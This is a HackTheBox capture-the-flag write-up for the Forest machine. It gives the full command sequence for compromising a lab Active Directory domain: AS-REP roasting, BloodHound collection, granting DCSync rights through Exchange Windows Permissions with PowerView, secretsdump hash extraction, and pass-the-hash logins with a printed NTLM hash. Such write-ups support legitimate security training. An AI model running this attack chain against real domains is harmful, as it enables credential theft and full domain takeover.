# Forest -- HackTheBox (write-up)

**Difficulty:** Easy
**Box:** Forest (HackTheBox)
**Author:** dkrxhn
**Date:** 2025-01-07

---

## TL;DR

### Null session enum4linux found domain users. AS-REP roasted svc-alfresco, cracked the hash. Added a new user to Exchange Windows Permissions group, granted DCSync rights via PowerView, then secretsdump for Administrator hash.
---
## Target info

- Host: `10.129.175.196` / `10.129.95.210`
- Domain: `htb.local`
- Services discovered: `53`, `88`, `135`, `139`, `389`, `445`, `593`, `636`, `3268`, `3269`, `5985`, `9389`
---
## Enumeration

nmap was too slow, used rustscan:

```bash
rustscan -a 10.129.175.196 -- -sCV
```

Key services: DNS, Kerberos, LDAP, SMB, WinRM.

```bash
ldapsearch -d 1 -x -H ldap://10.129.175.196 -b "dc=htb,dc=local"
```

Lots of info returned.

```bash
enum4linux -a -u "" -p "" 10.129.175.196
```

Found users: `sebastien`, `lucinda`, `svc-alfresco`, `andy`, `mark`, `santi`

---
## AS-REP roast

```bash
GetNPUsers.py -dc-ip 10.129.175.196 -request -usersfile users.txt htb.local/
```

Got svc-alfresco's AS-REP hash. Cracked it: `s3rvice`

---
## BloodHound

```bash
bloodhound-python -c All -dc FOREST.htb.local -gc FOREST.htb.local -ns 10.129.175.196 -d htb.local -u svc-alfresco -p 's3rvice'
```

Command is finnicky -- may need to run it twice.

---
## DCSync via Exchange Windows Permissions

```bash
evil-winrm -i 10.129.95.210 -u 'svc-alfresco' -p 's3rvice'
```

Uploaded PowerView.ps1 (capitalized PowerView from PowerSploit):

```powershell
. .\PowerView.ps1
```

svc-alfresco kept disappearing from Exchange Windows Permissions group, so I created a new user:

```powershell
net user zeus password /add /domain
net group "Exchange Windows Permissions" /add zeus
net user zeus
```

Confirmed Exchange Windows Permissions is listed.

```powershell
$pass = convertto-securestring 'password' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('htb\zeus', $pass)
Add-DomainObjectAcl -Credential $cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity zeus -Rights DCSync
```

If it fails, re-import PowerView.ps1.

From kali:

```bash
secretsdump.py -just-dc htb.local/zeus:password@10.129.95.210
```

Got: `Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::`

Pass the hash:

```bash
nxc winrm 10.129.95.210 -u "Administrator" -H "aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6" -x "type C:\Users\Administrator\Desktop\root.txt"
```

Can also use:

```bash
psexec.py administrator@10.129.95.210 -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6
evil-winrm -i 10.129.95.210 -u administrator -H 32693b11e6aa90eb43d32c72a07ceea6
```

---
## Lessons & takeaways

- Null session enumeration still works on some DCs -- always try it
- If a user keeps getting removed from a group (cleanup script), create a new user instead
- Exchange Windows Permissions group membership + PowerView = DCSync rights
- secretsdump.py with `-just-dc` is the cleanest way to dump hashes
